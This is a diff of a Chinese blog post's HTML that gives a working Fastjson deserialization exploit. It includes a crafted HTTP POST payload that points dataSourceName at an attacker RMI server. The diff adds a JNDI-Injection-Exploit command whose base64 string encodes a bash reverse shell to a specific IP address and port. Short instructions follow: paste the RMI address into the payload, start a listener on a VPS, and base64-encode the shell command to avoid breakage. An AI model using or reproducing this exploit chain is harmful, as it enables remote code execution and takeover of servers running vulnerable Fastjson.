@@ -363,7 +363,7 @@
           </header>
         
         <div class="entry-content">
-          <pre><code>payload:
+          <h3><span id="fastjson反弹shell">Fastjson反弹shell</span></h3><pre><code>payload:
 POST / HTTP/1.1
 Host: ip:8090
 Cache-Control: max-age=0
@@ -397,16 +397,13 @@ Content-Length: 161
         &quot;dataSourceName&quot;:&quot;rmi://your_ip:1099/Exploit&quot;,
         &quot;autoCommit&quot;:true
     }
-}</code></pre><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;加密后的反弹shell命令&quot; -A &quot;起rmi服务器的vps ip&quot;</code></pre><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210129141703116.png" alt="image-20210129141703116"></p>
-<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210129141849263.png" alt="image-20210129141849263"></p>
+}</code></pre><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OS4xNjguMjAzLzc3NzggMD4mMQ==}|{base64,-d}|{bash,-i}&quot; -A &quot;起rmi服务器的vps ip&quot;</code></pre><p><img src="/2021/01/26/Fastjson反弹shell/1625552736872.png" alt="1625552736872"></p>
 <p>将对应的rmi粘贴到payload中。</p>
 <p>然后vps上建立监听。</p>
 <p>成功图:</p>
-<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210126195038417.png" alt="image-20210126195038417"></p>
-<p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210129142956165.png" alt="image-20210129142956165"></p>
+<p><img src="/2021/01/26/Fastjson反弹shell/1625554589234.png" alt="1625554589234"></p>
 <p>重点:执行的shell先用base64加密下。不然会因为特殊符号、空格等原因导致反弹shell失败。</p>
 <p>参考:<a href="https://blog.csdn.net/qq_40007043/article/details/107615314" target="_blank" rel="noopener">https://blog.csdn.net/qq_40007043/article/details/107615314</a></p>
-<p><img src="/2021/01/26/Fastjson反弹shell/1612339807974.png" alt="1612339807974"></p>
 
         </div>
         <!-- .entry-content -->
